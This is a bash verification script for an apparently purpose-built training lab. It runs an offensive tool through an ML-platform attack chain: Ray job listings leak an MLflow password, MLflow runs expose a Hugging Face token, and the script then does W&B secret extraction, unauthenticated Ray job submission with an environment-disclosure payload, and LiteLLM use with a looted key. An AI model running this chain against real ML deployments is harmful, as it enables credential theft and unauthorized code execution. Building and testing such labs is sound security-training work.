#!/bin/bash
# verify-chain-tool.sh — drive the REAL aipostex binary through the exact
# commands an attendee (tactic) and the presenter (talk demos) actually run,
# and assert each hop lands its claim.
#
# WHY THIS EXISTS
# The signature chain (Ray→MLflow→TGI→inference) once shipped broken because
# nothing drove the tool's own user-facing commands: verify-chain.sh is pure
# curl (it validates the *estate*), and verify-aipostex.sh always passed
# `mlflow runs --experiment <id>` — so the bare `mlflow runs` an attendee runs
# (which must surface the HF token from a NON-default experiment) was tested
# nowhere. This script closes that gap: it runs the bare commands through the
# binary and fails loudly if the token/cred/inference does not fall out.
#
# It is the tool-side twin of verify-chain.sh (which proves the estate) and
# reuses the same authoritative chain-config.sh so both stay in sync.
#
# Usage (run ON the attack box, where the estate /24 is reachable):
#   bash verify-chain-tool.sh                 # chain + talk demos + score sanity
#   bash verify-chain-tool.sh --layer chain   # just the attendee tactic spine
#   bash verify-chain-tool.sh --layer talk    # just the presenter talk demos
#   AIPOSTEX=/path/to/aipostex bash verify-chain-tool.sh
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
# shellcheck source=lab-scripts/lib/inventory.sh
source "${LAB_DIR}/lib/inventory.sh"
# shellcheck source=lab-scripts/lib/chain-config.sh
source "${LAB_DIR}/lib/chain-config.sh"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
PASS=0; FAIL=0; WARN=0
LAYER="all"
[[ "${1:-}" == "--layer" && -n "${2:-}" ]] && LAYER="$2"

# Locate the binary: explicit AIPOSTEX, then ~/aipostex (attack-box convention), then PATH.
AIPOSTEX="${AIPOSTEX:-}"
if [[ -z "${AIPOSTEX}" ]]; then
    if [[ -x "${HOME}/aipostex" ]]; then AIPOSTEX="${HOME}/aipostex"
    elif command -v aipostex >/dev/null 2>&1; then AIPOSTEX="$(command -v aipostex)"
    else echo -e "${RED}aipostex binary not found (set AIPOSTEX=/path/to/aipostex)${NC}"; exit 2; fi
fi

RAY_URL="$(chain_ray_url)"
MLFLOW_URL="$(chain_mlflow_url)"
TGI_URL="$(chain_tgi_url)"
LITELLM_URL="$(chain_litellm_url)"
MLFLOW_AUTH="$(chain_mlflow_basic_header)"
HF_AUTH="$(chain_hf_bearer_header)"
LITELLM_AUTH="$(chain_litellm_bearer_header)"
ML_IP="$(inventory_host_ip ailab-ml)"

TMPDIR_RUN="$(mktemp -d)"
trap 'rm -rf "${TMPDIR_RUN}"' EXIT

log()     { echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} $1"; }
section() { echo ""; echo -e "${YELLOW}── $1 ──${NC}"; }
pass()    { echo -e "  ${GREEN}[✓]${NC} $1"; PASS=$((PASS + 1)); }
fail()    { echo -e "  ${RED}[✗]${NC} $1"; FAIL=$((FAIL + 1)); }
warn()    { echo -e "  ${YELLOW}[!]${NC} $1"; WARN=$((WARN + 1)); }

# run_tool <outfile> <args...> — run the binary with stdout (clean JSON) and
# stderr (human panels) captured SEPARATELY, so ${out} stays parseable for
# score.py. Records the exit code. Exit 1 is a HARD tool error; 0/2/3/4 all mean
# "the tool ran" (2=findings, 3=partial, 4=findings+partial per internal/exitcode).
run_tool() {
    local out="$1"; shift
    "${AIPOSTEX}" "$@" >"${out}" 2>"${out}.stderr"
    echo $? >"${out}.exit"
}
ran_ok() { # $1=label $2=outfile — hard-fail only on exit 1 / missing binary
    local label="$1" out="$2" code; code="$(cat "${out}.exit" 2>/dev/null || echo 99)"
    if [[ "${code}" == "1" || "${code}" == "99" || "${code}" == "2"[0-9]* ]]; then
        fail "${label} — tool errored (exit ${code}):"; sed 's/^/      /' "${out}.stderr" | tail -4; return 1
    fi
    return 0
}
assert_marker() { # $1=label $2=marker $3=outfile
    if grep -Fq "$2" "$3"; then pass "$1"; else
        fail "$1 — expected marker '$2' in output"; sed 's/^/      /' "$3" | tail -6; fi
}
assert_marker_regex() { # $1=label $2=regex $3=outfile
    if grep -Eq "$2" "$3"; then pass "$1"; else
        fail "$1 — expected pattern /$2/ in output"; sed 's/^/      /' "$3" | tail -6; fi
}

# ─────────────────────────────────────────────────────────────────────────────
# CHAIN — the attendee tactic spine, run as the EXACT bare commands they type.
# ─────────────────────────────────────────────────────────────────────────────
verify_chain() {
    section "Chain hop 1 — ray jobs leaks the MLflow Basic credential"
    run_tool "${TMPDIR_RUN}/ray-jobs.json" ray --target "${RAY_URL}" jobs --format json
    if ran_ok "ray jobs" "${TMPDIR_RUN}/ray-jobs.json"; then
        assert_marker "ray jobs exposes the looted MLflow password" \
            "${CHAIN_MLFLOW_PASSWORD}" "${TMPDIR_RUN}/ray-jobs.json"
    fi

    section "Chain hop 2 — BARE 'mlflow runs' surfaces the HF token (the gate)"
    # NO --experiment: exactly what an attendee runs. MLflow run-search is
    # experiment-scoped, so the tool MUST enumerate experiments first and search
    # across all of them, or the token in the non-default customer-embedding-model
    # experiment is silently missed (the original con-blocker).
    run_tool "${TMPDIR_RUN}/mlflow-runs-bare.json" \
        mlflow --target "${MLFLOW_URL}" --header "${MLFLOW_AUTH}" runs --limit 20 --format json
    if ran_ok "mlflow runs (bare)" "${TMPDIR_RUN}/mlflow-runs-bare.json"; then
        assert_marker "bare 'mlflow runs' surfaces the HF token" \
            "${CHAIN_HF_TOKEN}" "${TMPDIR_RUN}/mlflow-runs-bare.json"
    fi

    section "Chain hop 3 — huggingface generate performs REAL inference"
    run_tool "${TMPDIR_RUN}/hf-generate.json" \
        huggingface --target "${TGI_URL}" --header "${HF_AUTH}" generate \
        --prompt "incident response playbook" --force-exploit --format json
    if ran_ok "huggingface generate" "${TMPDIR_RUN}/hf-generate.json"; then
        # Real inference is graded execution-confirmed AND the TGI marks the body
        # "inference":"real" (fixture mode would say credential_replay). Require both signals.
        assert_marker_regex "hf generate lands execution-confirmed (real inference)" \
            '"landed" *: *"execution-confirmed"' "${TMPDIR_RUN}/hf-generate.json"
        assert_marker_regex "hf generate body is real (not a fixture replay)" \
            '"inference" *: *"real"|inference.?real' "${TMPDIR_RUN}/hf-generate.json"
    fi
}

# ─────────────────────────────────────────────────────────────────────────────
# TALK — the presenter demos (Demo B litellm gateway, Demo C kubeflow→wandb→ray).
# These run on stage; assert each surfaces its claim so nothing breaks live.
# ─────────────────────────────────────────────────────────────────────────────
verify_talk() {
    section "Talk Demo C — kubeflow pipelines enumerate"
    run_tool "${TMPDIR_RUN}/kubeflow-pipelines.json" \
        kubeflow --target "http://${ML_IP}:9000" pipelines --format json
    if ran_ok "kubeflow pipelines" "${TMPDIR_RUN}/kubeflow-pipelines.json"; then
        assert_marker_regex "kubeflow pipelines returns findings" \
            '"findings" *: *\[[^]]' "${TMPDIR_RUN}/kubeflow-pipelines.json"
    fi

    section "Talk Demo C — wandb secrets surfaces a credential"
    run_tool "${TMPDIR_RUN}/wandb-secrets.json" \
        wandb --target "http://${ML_IP}:8444" secrets \
        --entity acme-ml-team --project churn-prediction --force-exploit --format json
    if ran_ok "wandb secrets" "${TMPDIR_RUN}/wandb-secrets.json"; then
        assert_marker_regex "wandb secrets surfaces sensitive material" \
            '(extracted_credentials|api[_-]?key|secret|token|"landed")' "${TMPDIR_RUN}/wandb-secrets.json"
    fi

    section "Talk Demo C — ray submit (unauth job execution finale)"
    run_tool "${TMPDIR_RUN}/ray-submit.json" \
        ray --target "${RAY_URL}" submit --payload-preset env-disclosure --force-exploit --format json
    if ran_ok "ray submit" "${TMPDIR_RUN}/ray-submit.json"; then
        assert_marker_regex "ray submit lands an executed/accepted job" \
            '"landed" *: *"(execution-confirmed|influenced)"' "${TMPDIR_RUN}/ray-submit.json"
    fi

    section "Talk Demo B — openai-compat generate via the LiteLLM gateway (looted key)"
    run_tool "${TMPDIR_RUN}/oai-generate.json" \
        openai-compat --target "${LITELLM_URL}" --header "${LITELLM_AUTH}" generate \
        --model local-smollm --prompt "Say READY" --force-exploit --format json
    if ran_ok "openai-compat generate" "${TMPDIR_RUN}/oai-generate.json"; then
        assert_marker_regex "openai-compat generate verifies real input-dependent inference" \
            '"inference_input_dependent" *: *true|input-dependent inference' "${TMPDIR_RUN}/oai-generate.json"
    fi
}

# ─────────────────────────────────────────────────────────────────────────────
# SCORE — sanity-check that score.py CONSUMES real tool output (the scoring
# pytest is fixture-only and never runs the binary). We do NOT assert the pass
# threshold — a chain-only run is deliberately low coverage — only that score.py
# parses real findings and recognizes some of them.
# ─────────────────────────────────────────────────────────────────────────────
verify_score() {
    section "Scoring — score.py consumes real tool output"
    local score_py="${LAB_DIR}/scoring/score.py"
    if [[ ! -f "${score_py}" ]] || ! command -v python3 >/dev/null 2>&1; then
        warn "score.py or python3 unavailable — skipping scoring sanity check"; return
    fi
    # This check only has data when chain+talk captures already populated TMPDIR
    # (i.e. run as --layer all, not standalone --layer score).
    shopt -s nullglob
    local captures=("${TMPDIR_RUN}"/*.json)
    shopt -u nullglob
    if [[ ${#captures[@]} -eq 0 ]]; then
        warn "no tool captures yet — run 'verify-chain-tool.sh' (all layers) to exercise scoring"; return
    fi
    # Feed every captured chain/talk JSON to score.py --json and confirm it emits
    # a parseable report (proves the manifest/matcher still align with real output).
    local report="${TMPDIR_RUN}/score-report.json"
    python3 "${score_py}" "${captures[@]}" --json >"${report}" 2>"${report}.err" || true
    # Meaningful signal: score.py parsed real output AND recognized planted
    # findings in it (total_found > 0) — proving the manifest/matcher still align
    # with what the tool emits today, which the fixture-only pytest cannot show.
    local found
    found=$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d["overall"]["total_found"])' "${report}" 2>/dev/null || echo "")
    if [[ -n "${found}" && "${found}" -gt 0 ]]; then
        pass "score.py graded real tool output (recognized ${found}/170 planted findings)"
    else
        fail "score.py did not recognize any findings in real tool output"
        sed 's/^/      /' "${report}.err" 2>/dev/null | tail -6
    fi
}

echo ""
echo -e "${CYAN}════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  aipostex TOOL-DRIVEN chain + demo verification${NC}"
echo -e "${CYAN}════════════════════════════════════════════════${NC}"
log "binary:  ${AIPOSTEX}"
log "ray:     ${RAY_URL}"
log "mlflow:  ${MLFLOW_URL}"
log "tgi:     ${TGI_URL}"
log "litellm: ${LITELLM_URL}"

case "${LAYER}" in
    chain) verify_chain ;;
    talk)  verify_talk ;;
    score) verify_score ;;
    all)   verify_chain; verify_talk; verify_score ;;
    *)     echo -e "${RED}unknown layer: ${LAYER}${NC}"; exit 2 ;;
esac

echo ""
echo -e "${CYAN}════════════════════════════════════════════════${NC}"
echo -e "  Final: ${GREEN}${PASS} passed${NC}, ${RED}${FAIL} failed${NC}, ${YELLOW}${WARN} warnings${NC}"
echo -e "${CYAN}════════════════════════════════════════════════${NC}"
echo ""
[[ "${FAIL}" -eq 0 ]]
